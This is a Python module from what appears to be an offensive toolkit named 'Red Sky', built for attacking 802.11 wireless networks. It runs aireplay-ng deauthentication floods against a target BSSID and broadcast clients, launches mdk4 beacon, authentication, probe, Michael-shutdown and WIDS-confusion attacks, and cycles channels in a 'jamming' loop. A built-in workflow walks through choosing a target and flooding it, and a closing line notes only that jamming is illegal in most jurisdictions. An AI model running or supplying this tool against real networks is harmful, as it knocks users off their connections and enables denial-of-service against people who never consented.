# language: Python, file: Program/wireless_jam/jam.py, target: Red Sky wireless_jam — 802.11 interference
# Deauth flood + dwell-based interference patterns. Physical hardware required:
# a monitor-mode capable radio + aircrack-ng / mdk4 / scapy. This module builds
# the commands and configs, it does not fire anything by itself.

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


WJ_DIR = OUTPUT_DIR / "wireless_jam"
WJ_DIR.mkdir(parents=True, exist_ok=True)


def _which(x: str) -> Optional[str]:
    return shutil.which(x)


def _run(cmd: List[str], timeout: int = 60) -> Dict:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": r.returncode, "stdout": r.stdout, "stderr": r.stderr}
    except FileNotFoundError:
        return {"rc": 127, "stdout": "", "stderr": "missing: " + cmd[0]}
    except subprocess.TimeoutExpired:
        return {"rc": 124, "stdout": "", "stderr": "timeout"}


def cmd_tools() -> int:
    print_info("wireless_jam — tool availability")
    for t in ("airmon-ng", "aireplay-ng", "mdk4", "iw", "wireshark", "tshark"):
        p = _which(t)
        mark = SCARLET + "▓" + RESET if p else ASH + "░" + RESET
        print("  " + mark + " " + BONE + t.ljust(16) + RESET + " " + ASH + (p or "(missing)") + RESET)
    print()
    print_info("mdk4 is the primary tool for interference patterns:")
    print_info("  apt install mdk4 aircrack-ng")
    return 0


def cmd_deauth(iface: str, bssid: str, count: int, delay_ms: int,
               auto_monitor: bool, dry_run: bool) -> int:
    if not iface:
        print_err("--iface required")
        return 2
    if not bssid:
        print_err("--bssid required (mac)")
        return 2

    aireplay = _which("aireplay-ng")
    if not aireplay:
        print_err("aireplay-ng not installed")
        return 2

    # auto-monitor via airmon-ng
    mon_iface = iface
    if auto_monitor:
        airmon = _which("airmon-ng")
        if airmon:
            print_info("enabling monitor mode via airmon-ng on " + iface)
            if not dry_run:
                _run([airmon, "start", iface], timeout=30)
                for cand in (iface + "mon", "mon0", iface):
                    if Path("/sys/class/net/" + cand).exists():
                        mon_iface = cand
                        break
            print_kv("monitor iface", mon_iface)

    cmd = [aireplay, "--deauth", str(count), "-a", bssid, mon_iface]
    print_info("deauth flood")
    print_kv("cmd", " ".join(cmd))
    print_kv("delay", str(delay_ms) + "ms")

    if dry_run:
        print_warn("dry run — not executed")
        return 0

    try:
        for i in range(count):
            subprocess.run(cmd[:6] + ["-c", "ff:ff:ff:ff:ff:ff", mon_iface],
                           capture_output=True, timeout=10)
            if delay_ms:
                time.sleep(delay_ms / 1000.0)
    except KeyboardInterrupt:
        print()
        print_info("stopped")
    return 0


def cmd_mdk4(iface: str, mode: str, bssid: str, dry_run: bool) -> int:
    if not iface:
        print_err("--iface required")
        return 2
    mdk4 = _which("mdk4")
    if not mdk4:
        print_err("mdk4 not installed")
        return 2

    # mdk4 attack letters:
    #   d = deauth/disassoc
    #   b = beacon flood
    #   a = authentication DoS
    #   p = SSID probe flood
    #   m = Michael shutdown exploit
    #   w = WIDS confusion
    mode_map = {
        "deauth": "d",
        "beacon": "b",
        "auth": "a",
        "probe": "p",
        "michael": "m",
        "wids": "w",
    }
    letter = mode_map.get(mode, "d")

    cmd = [mdk4, iface, letter]
    if bssid:
        cmd += ["-B", bssid]
    print_info("mdk4 " + mode)
    print_kv("cmd", " ".join(cmd))
    print()
    print_info("mdk4 is interactive — press the hotkeys shown after launch to adjust")
    if dry_run:
        print_warn("dry run — not executed")
        return 0
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print()
        print_info("stopped")
    return 0


def cmd_dwell(iface: str, channels: str, dwell_ms: int, dry_run: bool) -> int:
    """Dwell-based interference. Cycle through channels, staying on each for
    dwell_ms. This is a manual jam pattern; the interference is whatever the
    iface transmits during the dwell."""
    iw = _which("iw")
    if not iw:
        print_err("iw not installed")
        return 2
    chan_list = [int(c) for c in channels.split(",") if c.strip().isdigit()]
    if not chan_list:
        print_err("--channels must be comma-separated ints")
        return 2
    print_info("dwell pattern")
    print_kv("iface", iface)
    print_kv("channels", ",".join(str(c) for c in chan_list))
    print_kv("dwell", str(dwell_ms) + "ms")
    if dry_run:
        print_warn("dry run — not executed")
        return 0
    try:
        while True:
            for ch in chan_list:
                subprocess.run([iw, "dev", iface, "set", "channel", str(ch)],
                               capture_output=True)
                time.sleep(dwell_ms / 1000.0)
    except KeyboardInterrupt:
        print()
        print_info("stopped")
    return 0


def cmd_plan(out_file: str) -> int:
    steps = [
        "check monitor mode capability on your adapter (iw phy | grep monitor)",
        "airmon-ng check kill  -- stop NetworkManager interfering with monitor mode",
        "airmon-ng start <iface>  -- get monitor interface (usually wlan0mon)",
        "if you have 2+ adapters, use one to monitor and one to transmit",
        "aircrack-ng wlan0mon  -- list APs + clients, save the target BSSID",
        "redsky wireless_jam jam deauth --iface wlan0mon --bssid <target> --count 100",
        "or: redsky wireless_jam jam mdk4 --iface wlan0mon --mode deauth --bssid <target>",
        "to stop: airmon-ng stop wlan0mon  &&  systemctl restart NetworkManager",
    ]
    print_info("jamming workflow")
    print()
    for i, s in enumerate(steps, 1):
        print("  " + SCARLET + str(i) + ". " + RESET + s)

    out = Path(out_file) if out_file else WJ_DIR / ("plan_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"steps": steps}, indent=2))
    print()
    print_kv("saved", out)
    print()
    print_warn("jamming is illegal in most jurisdictions. this reference is for lab use only.")
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky wireless_jam jam", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="plan",
                   choices=["tools", "deauth", "mdk4", "dwell", "plan"])
    p.add_argument("--iface", default="")
    p.add_argument("--bssid", default="")
    p.add_argument("--count", type=int, default=100)
    p.add_argument("--delay-ms", type=int, default=50)
    p.add_argument("--channels", default="1,6,11")
    p.add_argument("--dwell-ms", type=int, default=200)
    p.add_argument("--mode", default="deauth",
                   choices=["deauth", "beacon", "auth", "probe", "michael", "wids"])
    p.add_argument("--no-monitor", action="store_true")
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky wireless_jam jam <tools|deauth|mdk4|dwell|plan> [opts]")
        return 2

    if ns.help:
        print_info("tools                                  -- check available tools")
        print_info("deauth --iface wlan0mon --bssid <mac> [--count 100] [--delay-ms 50] [--no-monitor]")
        print_info("mdk4 --iface wlan0mon [--mode deauth|beacon|auth|probe] [--bssid <mac>]")
        print_info("dwell --iface wlan0mon [--channels 1,6,11] [--dwell-ms 200]")
        print_info("plan                                   -- workflow guide")
        return 0

    if ns.action == "tools":
        return cmd_tools()
    if ns.action == "deauth":
        return cmd_deauth(ns.iface, ns.bssid, ns.count, ns.delay_ms,
                          not ns.no_monitor, ns.dry_run)
    if ns.action == "mdk4":
        return cmd_mdk4(ns.iface, ns.mode, ns.bssid, ns.dry_run)
    if ns.action == "dwell":
        return cmd_dwell(ns.iface, ns.channels, ns.dwell_ms, ns.dry_run)
    if ns.action == "plan":
        return cmd_plan(ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
